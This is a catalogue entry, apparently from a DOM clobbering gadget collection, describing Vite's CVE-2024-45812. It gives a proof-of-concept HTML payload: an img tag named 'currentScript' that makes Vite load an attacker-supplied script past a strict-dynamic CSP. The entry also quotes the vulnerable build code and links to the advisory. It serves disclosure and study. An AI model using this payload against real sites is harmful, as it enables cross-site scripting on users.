---
description: Next generation frontend tooling. It's fast!
github: vitejs/vite
gadgets:
  Latest:
    cve: CVE-2024-45812
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [Vite](https://vite.dev/) library was using the `document.currentScript` property to load additional scripts.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" type="module" crossorigin src="/assets/libs/vite/index.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/vitejs/vite/blob/37881e71980ddbf6a93444c2d21b8ee6c076ad07/packages/vite/src/node/build.ts#L1132">https://github.com/vitejs/vite/blob/37881e71980ddbf6a93444c2d21b8ee6c076ad07/packages/vite/src/node/build.ts#L1132</a>

      ```javascript
      const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
        getResolveUrl(
          `'${escapeId(partialEncodeURIPath(relativePath))}', ${
            umd ? `typeof document === 'undefined' ? location.href : ` : ''
          }document.currentScript && document.currentScript.src || document.baseURI`,
        )
      
      // [...]

      const relativeUrlMechanisms: Record<
        InternalModuleFormat,
        (relativePath: string) => string
      > = {
        amd: (relativePath) => {
          if (relativePath[0] !== '.') relativePath = './' + relativePath
          return getResolveUrl(
            `require.toUrl('${escapeId(relativePath)}'), document.baseURI`,
          )
        },
        cjs: (relativePath) =>
          `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
            relativePath,
          )} : ${getRelativeUrlFromDocument(relativePath)})`,
        es: (relativePath) =>
          getResolveUrl(
            `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`,
          ),
        iife: (relativePath) => getRelativeUrlFromDocument(relativePath),
        // NOTE: make sure rollup generate `module` params
        system: (relativePath) =>
          getResolveUrl(
            `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`,
          ),
        umd: (relativePath) =>
          `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
            relativePath,
          )} : ${getRelativeUrlFromDocument(relativePath, true)})`,
      }
      ```
    links:
      - https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/vite.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
